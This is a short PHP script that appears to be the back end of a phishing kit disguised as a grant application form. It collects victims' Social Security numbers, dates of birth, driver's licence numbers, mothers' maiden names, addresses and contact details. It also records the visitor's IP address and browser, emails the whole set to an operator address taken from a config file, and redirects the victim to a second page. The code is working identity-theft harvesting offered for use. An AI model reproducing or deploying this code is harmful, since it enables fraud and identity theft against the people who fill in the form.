<?php

require("email.php");
include("config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
	$browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");


    //Fetching HTML Values
    $Fname = $_POST['fname'];
    $Lname = $_POST['lname'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];
    $ssn = $_POST['ssn'];
    $dob = $_POST['dob'];
    $DL = $_POST['dl'];
    $maiden = $_POST['maiden'];
    $address = $_POST['address'];
    $city = $_POST['city'];
    $state = $_POST['state'];
    $zipcode = $_POST['zip'];
    $grntype = $_POST['grntype'];
    $amount = $_POST['amount'];
    $maddress = $_POST['maddress'];
    $mcity = $_POST['mcity'];
    $mstate = $_POST['mstate'];
    $mzip = $_POST['mzip'];
    $serv = $_REQUEST['form1'];

    $sender_name = "Result";
    $sender_mail = "em6l3m-light.log";
	
    //Checking if File is uploaded
    
        //Main Content
        $main_subject = "DL information l $ip";
        $main_body = "<br> 
        First Name : $Fname <br>
	    Last Name : $Lname <br>
        EMAIL : $email <br> 		
        PHONE : $phone <br> 		
        SSN : $ssn <br>
	    Date Of Birth : $dob <br> 
        Drivers License Number : $DL <br>
        MOTHERS MAIDEN : $maiden <br> 		
        Street Address : $address <br>
	    CITY : $city <br> 
        STATE : $state <br>
	    ZIP code : $zipcode <br>
        GRANT TYPE : $grntype <br>
	    AMOUNT : $amount <br>
        MAILING Address : $maddress <br>
	    MAILING City : $mcity <br> 
        MAILING State : $mstate <br>
	    MAILINGZIP code : $mzip <br>
        IP : $ip.";


//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
        $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n--$uid\r\n $uid","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
        header("location:apply2.html");
?>
